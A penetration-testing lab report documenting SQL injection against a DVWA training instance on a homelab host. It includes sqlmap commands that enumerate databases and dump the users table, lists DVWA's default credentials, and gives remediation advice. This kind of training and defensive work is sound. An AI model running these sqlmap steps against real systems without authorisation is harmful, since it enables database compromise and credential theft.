# DVWA SQL Injection Report Level Low

## Overview

This report documents the discovery and exploitation of a SQL Injection vulnerability
in a DVWA (Damn Vulnerable Web Application) lab environment, along
with remediation recommendations.

---

## 1. Reconnaissance & Request Capture

The login request was intercepted using Burp Suite:

```
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: dvwa-1.homelab.local
Cookie: PHPSESSID=xxxx; security=low
```

### Key Observations

- Parameter `id` is user-controlled
- Application uses GET requests
- Session cookie required
- Security level set to **low**

---

## 2. Preparing the Attack

The captured request was saved into a file:

```
sqlmap-input.txt
```

This allowed replaying an authenticated request using sqlmap.

---

## 3. Vulnerability Discovery

Command used:

```
sqlmap -r sqlmap-input.txt --random-agent --dbs --level=2
```

### Results

- Parameter `id` is vulnerable to SQL injection
- Backend DBMS identified: **MySQL (MariaDB)**
- Injection types discovered:
  - Boolean-based blind
  - Error-based
  - Time-based blind
  - UNION-based

---

## 4. Enumeration

### Databases discovered

- dvwa
- information_schema
- test

### Tables in `dvwa`

- users
- guestbook
- access_log
- security_log

### Target table

```
users
```

---

## 💣 5. Exploitation (Data Extraction)

Command used:

```
sqlmap -r sqlmap-input.txt --dump -D dvwa -T users
```

### Extracted Data

| User   | Password |
|--------|----------|
| admin  | password |
| gordonb| abc123   |
| 1337   | charley  |
| pablo  | letmein  |
| smithy | password |

### Notes

- Passwords were stored as **unsalted MD5 hashes**
- sqlmap successfully cracked them using a dictionary attack

---

## 6. Impact

This vulnerability allows:

- Unauthorized access to user accounts
- Credential theft
- Privilege escalation (admin access)
- Full database enumeration

---

## 7. Root Cause

The vulnerability exists due to:

- Direct insertion of user input into SQL queries
- No input sanitization
- No prepared statements
- Weak password hashing (MD5)

---

## 8. Remediation Recommendations

### 1. Use Prepared Statements

Replace dynamic SQL queries with parameterized queries.

### 2. Implement Strong Password Hashing

Use:

- bcrypt
- argon2

### 3. Input Validation & Sanitization

- Validate all user inputs
- Reject unexpected characters

### 4. Deploy a Web Application Firewall (WAF)

- Detect SQL injection patterns
- Block malicious payloads

### 5. Monitoring & Logging

- Detect abnormal query behavior
- Alert on repeated injection attempts

---

## 9. Lessons Learned

### Offensive

- Importance of request replay (`-r`)
- Value of UNION-based SQLi
- Structured enumeration approach

### Defensive

- SQL injection is still a critical risk
- Logging and detection are essential
- Secure coding practices prevent exploitation

---

## Conclusion

The DVWA application was fully compromised through SQL Injection, demonstrating how improper input handling can lead to complete data exposure. Proper remediation steps must be implemented to prevent such attacks in real-world environments.
